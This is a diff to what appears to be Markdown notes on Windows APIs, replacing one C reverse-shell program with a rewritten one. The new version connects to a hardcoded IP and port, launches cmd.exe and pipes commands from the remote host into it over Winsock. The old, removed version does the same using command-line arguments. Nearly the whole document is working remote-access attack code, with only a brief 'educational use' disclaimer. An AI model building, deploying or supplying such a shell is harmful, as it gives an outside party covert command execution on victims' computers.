@@ -535,110 +535,152 @@ void OutputDebugStringA(
 
 ### Winsock
 ```c
-/***
- * Windows Reverse Shell
- * Written by: snowcra5h@icloud.com (Mike Walker) 2023
+/*** Windows Reverse Shell
  * 
- * This program establishes a reverse shell via the Winsock2 library. It is 
+ *   ██████  ███▄    █  ▒█████   █     █░ ▄████▄   ██▀███   ▄▄▄        ██████  ██░ ██
+ * ▒██    ▒  ██ ▀█   █ ▒██▒  ██▒▓█░ █ ░█░▒██▀ ▀█  ▓██ ▒ ██▒▒████▄    ▒██    ▒ ▓██░ ██▒
+ * ░ ▓██▄   ▓██  ▀█ ██▒▒██░  ██▒▒█░ █ ░█ ▒▓█    ▄ ▓██ ░▄█ ▒▒██  ▀█▄  ░ ▓██▄   ▒██▀▀██░
+ *   ▒   ██▒▓██▒  ▐▌██▒▒██   ██░░█░ █ ░█ ▒▓▓▄ ▄██▒▒██▀▀█▄  ░██▄▄▄▄██   ▒   ██▒░▓█ ░██
+ * ▒██████▒▒▒██░   ▓██░░ ████▓▒░░░██▒██▓ ▒ ▓███▀ ░░██▓ ▒██▒ ▓█   ▓██▒▒██████▒▒░▓█▒░██▓
+ * ▒ ▒▓▒ ▒ ░░ ▒░   ▒ ▒ ░ ▒░▒░▒░ ░ ▓░▒ ▒  ░ ░▒ ▒  ░░ ▒▓ ░▒▓░ ▒▒   ▓▒█░▒ ▒▓▒ ▒ ░ ▒ ░░▒░▒
+ * ░ ░▒  ░ ░░ ░░   ░ ▒░  ░ ▒ ▒░   ▒ ░ ░    ░  ▒     ░▒ ░ ▒░  ▒   ▒▒ ░░ ░▒  ░ ░ ▒ ░▒░ ░
+ * ░  ░  ░     ░   ░ ░ ░ ░ ░ ▒    ░   ░  ░          ░░   ░   ░   ▒   ░  ░  ░   ░  ░░ ░
+ *       ░           ░     ░ ░      ░    ░ ░         ░           ░  ░      ░   ░  ░  ░
+ *                                   Written by: snowcra5h@icloud.com (snowcra5h) 2023
+ *
+ * This program establishes a reverse shell via the Winsock2 library. It is
  * designed to establish a connection to a specified remote server, and execute commands
- * received from the server on the local machine, giving the server 
+ * received from the server on the local machine, giving the server
  * control over the local machine.
- * 
+ *
  * Compile command (using MinGW on Wine):
  * wine gcc.exe windows.c -o windows.exe -lws2_32
- * 
- * This code is intended for educational and legitimate penetration testing purposes only. 
+ *
+ * This code is intended for educational and legitimate penetration testing purposes only.
  * Please use responsibly and ethically.
  *
- * Based on Code By: Ma~Far$ (a.k.a. Yahav N. Hoffmann) 2016.
- * https://www.sololearn.com/compiler-playground/c9QMueL0jHiy/#cpp
  */
 
 #include <winsock2.h>
 #include <ws2tcpip.h>
 #include <stdio.h>
+#include <windows.h>
+#include <process.h>
 
-#pragma comment(lib, "ws2_32.lib")
+const char* const PORT = "1337";
+const char* const IP = "10.37.129.2";
 
-int main(int argc, char *argv[]) 
-{
+typedef struct {
+    HANDLE hPipeRead;
+    HANDLE hPipeWrite;
+    SOCKET sock;
+} ThreadParams;
+
+DWORD WINAPI OutputThreadFunc(LPVOID data);
+DWORD WINAPI InputThreadFunc(LPVOID data);
+void CleanUp(HANDLE hInputWrite, HANDLE hInputRead, HANDLE hOutputWrite, HANDLE hOutputRead, PROCESS_INFORMATION processInfo, addrinfo* result, SOCKET sock);
+
+int main(int argc, char** argv) {
     WSADATA wsaData;
-    SOCKET socketDescriptor;
-    struct sockaddr_in serverInfo;
-    char ipAddress[16];
-    STARTUPINFO startupInfo;
-    PROCESS_INFORMATION processInfo;
-
-    if (argc != 3)
-    {
-        fprintf(stderr, "Usage: <RemoteHost> <RemotePort>\n");
+    int err = WSAStartup(MAKEWORD(2, 2), &wsaData);
+    if (err != 0) {
+        fprintf(stderr, "WSAStartup failed: %d\n", err);
         return 1;
     }
 
-    // Initialize Winsock
-    if (WSAStartup(MAKEWORD(2,2), &wsaData) != 0) 
-    {
-        fprintf(stderr, "Failed to initialize Winsock.\n");
-        return 1;
-    }
-
-    // Create a socket
-    socketDescriptor = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
-    if (socketDescriptor == INVALID_SOCKET)
-    {
-        fprintf(stderr, "Failed to create socket.\n");
-        WSACleanup();
-        return 1;
-    }
-    
-    struct hostent *host;
-    host = gethostbyname(argv[1]);
-    if (host == NULL)
-    {
-        fprintf(stderr, "Failed to get host.\n");
-        closesocket(socketDescriptor);
+    SOCKET sock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, WSA_FLAG_OVERLAPPED);
+    if (sock == INVALID_SOCKET) {
+        fprintf(stderr, "Socket function failed with error = %d\n", WSAGetLastError());
         WSACleanup();
         return 1;
     }
 
-    strcpy(ipAddress, inet_ntoa(*(struct in_addr*)host->h_addr_list[0]));
-    
-    // Set up the server information
-    serverInfo.sin_family = AF_INET;
-    serverInfo.sin_port = htons(atoi(argv[2]));
-    serverInfo.sin_addr.s_addr = inet_addr(ipAddress);
+    struct addrinfo hints = { 0 };
+    hints.ai_family = AF_INET;
+    hints.ai_socktype = SOCK_STREAM;
+    struct addrinfo* result;
+    err = getaddrinfo(IP, PORT, &hints, &result);
+    if (err != 0) {
+        fprintf(stderr, "Failed to get address info: %d\n", err);
+        CleanUp(NULL, NULL, NULL, NULL, { 0 }, result, sock);
+        return 1;
+    }
 
-    // Connect to the server
-    if (WSAConnect(socketDescriptor, (SOCKADDR*)&serverInfo, sizeof(serverInfo), NULL, NULL, NULL, NULL) == SOCKET_ERROR)
-    {
+    if (WSAConnect(sock, result->ai_addr, (int)result->ai_addrlen, NULL, NULL, NULL, NULL) == SOCKET_ERROR) {
         fprintf(stderr, "Failed to connect.\n");
-        closesocket(socketDescriptor);
-        WSACleanup();
+        CleanUp(NULL, NULL, NULL, NULL, { 0 }, result, sock);
         return 1;
     }
 
-    // Prepare the structures for creating a new process
-    memset(&startupInfo, 0, sizeof(startupInfo));
+    SECURITY_ATTRIBUTES sa = { sizeof(SECURITY_ATTRIBUTES), NULL, TRUE };
+    HANDLE hInputWrite, hOutputRead, hInputRead, hOutputWrite;
+    if (!CreatePipe(&hOutputRead, &hOutputWrite, &sa, 0) || !CreatePipe(&hInputRead, &hInputWrite, &sa, 0)) {
+        fprintf(stderr, "Failed to create pipe.\n");
+        CleanUp(NULL, NULL, NULL, NULL, { 0 }, result, sock);
+        return 1;
+    }
+
+    STARTUPINFO startupInfo = { 0 };
     startupInfo.cb = sizeof(startupInfo);
     startupInfo.dwFlags = STARTF_USESTDHANDLES;
-    startupInfo.hStdInput = startupInfo.hStdOutput = startupInfo.hStdError = (HANDLE)socketDescriptor;
+    startupInfo.hStdInput = hInputRead;
+    startupInfo.hStdOutput = hOutputWrite;
+    startupInfo.hStdError = hOutputWrite;
+    PROCESS_INFORMATION processInfo;
 
-    // Create a new process - command shell
-    if (!CreateProcess(NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &startupInfo, &processInfo))
-    {
+    WCHAR cmd[] = L"cmd.exe /k";
+    if (!CreateProcess(NULL, cmd, NULL, NULL, TRUE, 0, NULL, NULL, &startupInfo, &processInfo)) {
         fprintf(stderr, "Failed to create process.\n");
-        closesocket(socketDescriptor);
-        WSACleanup();
+        CleanUp(hInputWrite, hInputRead, hOutputWrite, hOutputRead, processInfo, result, sock);
         return 1;
     }
 
-    // Clean up
-    CloseHandle(processInfo.hProcess);
+    CloseHandle(hInputRead);
+    CloseHandle(hOutputWrite);
     CloseHandle(processInfo.hThread);
-    closesocket(socketDescriptor);
-    WSACleanup();
+    ThreadParams outputParams = { hOutputRead, NULL, sock };
+    ThreadParams inputParams = { NULL, hInputWrite, sock };
+    HANDLE hThread[2];
+    hThread[0] = CreateThread(NULL, 0, OutputThreadFunc, &outputParams, 0, NULL);
+    hThread[1] = CreateThread(NULL, 0, InputThreadFunc, &inputParams, 0, NULL);
 
-    return 0;  
+    WaitForMultipleObjects(2, hThread, TRUE, INFINITE);
+    CleanUp(hInputWrite, NULL, NULL, hOutputRead, processInfo, result, sock);
+    return 0;
+}
+
+void CleanUp(HANDLE hInputWrite, HANDLE hInputRead, HANDLE hOutputWrite, HANDLE hOutputRead, PROCESS_INFORMATION processInfo, addrinfo* result, SOCKET sock) {
+    if (hInputWrite != NULL) CloseHandle(hInputWrite);
+    if (hInputRead != NULL) CloseHandle(hInputRead);
+    if (hOutputWrite != NULL) CloseHandle(hOutputWrite);
+    if (hOutputRead != NULL) CloseHandle(hOutputRead);
+    if (processInfo.hProcess != NULL) CloseHandle(processInfo.hProcess);
+    if (processInfo.hThread != NULL) CloseHandle(processInfo.hThread);
+    if (result != NULL) freeaddrinfo(result);
+    if (sock != NULL) closesocket(sock);
+    WSACleanup();
+}
+
+DWORD WINAPI OutputThreadFunc(LPVOID data) {
+    ThreadParams* params = (ThreadParams*)data;
+    char buffer[4096];
+    DWORD bytesRead;
+    while (ReadFile(params->hPipeRead, buffer, sizeof(buffer) - 1, &bytesRead, NULL)) {
+        buffer[bytesRead] = '\0';
+        send(params->sock, buffer, bytesRead, 0);
+    }
+    return 0;
+}
+
+DWORD WINAPI InputThreadFunc(LPVOID data) {
+    ThreadParams* params = (ThreadParams*)data;
+    char buffer[4096];
+    int bytesRead;
+    while ((bytesRead = recv(params->sock, buffer, sizeof(buffer) - 1, 0)) > 0) {
+        DWORD bytesWritten;
+        WriteFile(params->hPipeWrite, buffer, bytesRead, &bytesWritten, NULL);
+    }
+    return 0;
 }
 ```
 [WSAStartup](https://docs.microsoft.com/en-us/windows/win32/api/winsock/nf-winsock-wsastartup)
